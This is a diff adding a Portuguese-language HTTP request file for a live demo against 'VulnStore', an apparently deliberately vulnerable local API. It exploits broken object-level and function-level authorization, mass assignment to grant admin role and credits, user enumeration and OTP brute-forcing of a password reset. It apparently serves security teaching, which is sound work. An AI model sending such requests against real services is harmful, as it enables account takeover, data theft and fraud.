@@ -1,0 +1,86 @@
+############################################################################
+# VulnStore — requisições cruas da demo
+#
+# - No VS Code (extensão REST Client) ou JetBrains HTTP Client: clique em
+#   "Send Request" acima de cada bloco.
+# - Plano B caso o Postman dê problema no dia. A demo principal é pela
+#   coleção do Postman (pasta postman/).
+# - Troque @base para http://127.0.0.1:3001 para repetir tudo no modo seguro.
+############################################################################
+
+@base = http://127.0.0.1:3000
+# cole aqui o token devolvido pelo login
+@token = COLE_O_TOKEN_AQUI
+
+### 0. Login do atacante (João)
+POST {{base}}/api/auth/login
+Content-Type: application/json
+
+{"email":"joao@vulnstore.test","password":"joao123"}
+
+### 1. EXCESSIVE DATA EXPOSURE — rota pública de avaliações
+GET {{base}}/api/products/1/reviews
+
+### 2. BOLA — meu pedido
+GET {{base}}/api/orders/1003
+Authorization: Bearer {{token}}
+
+### 2b. BOLA — pedido de outro cliente (só troquei o ID)
+#  Em escala: node scripts/enum-orders.js http://127.0.0.1:3000 1000 1010
+GET {{base}}/api/orders/1002
+Authorization: Bearer {{token}}
+
+### 2c. BOLA em escrita — cancelar o pedido da Ana
+POST {{base}}/api/orders/1001/cancel
+Authorization: Bearer {{token}}
+
+### 3. BFLA — rota administrativa com token de cliente
+GET {{base}}/api/admin/users
+Authorization: Bearer {{token}}
+
+### 3b. BFLA — trocar o método: GET -> DELETE
+DELETE {{base}}/api/admin/users/5
+Authorization: Bearer {{token}}
+
+### 4. MASS ASSIGNMENT — antes: criar cupom dá 403
+POST {{base}}/api/admin/coupons
+Authorization: Bearer {{token}}
+Content-Type: application/json
+
+{"code":"HACK100","discount":100}
+
+### 4b. MASS ASSIGNMENT — adicionar campos que o formulário não tem
+PATCH {{base}}/api/users/me
+Authorization: Bearer {{token}}
+Content-Type: application/json
+
+{"name":"João Silva","role":"admin","credits":99999}
+
+### 4c. MASS ASSIGNMENT — depois: repita a requisição 4 (agora 201)
+
+### 5. RATE LIMITING — enumeração de usuários (compare as mensagens)
+POST {{base}}/api/auth/login
+Content-Type: application/json
+
+{"email":"maria@vulnstore.test","password":"x"}
+
+### 5b.
+POST {{base}}/api/auth/login
+Content-Type: application/json
+
+{"email":"bruno@vulnstore.test","password":"x"}
+
+### 5c. Disparar o código de recuperação para a Ana
+POST {{base}}/api/auth/forgot-password
+Content-Type: application/json
+
+{"email":"ana@vulnstore.test"}
+
+### 5d. Alvo do brute force — no ao vivo use: node scripts/brute-otp.js
+POST {{base}}/api/auth/reset-password
+Content-Type: application/json
+
+{"email":"ana@vulnstore.test","code":"0000","newPassword":"hackeada123"}
+
+### Reset do laboratório
+POST {{base}}/api/__reset
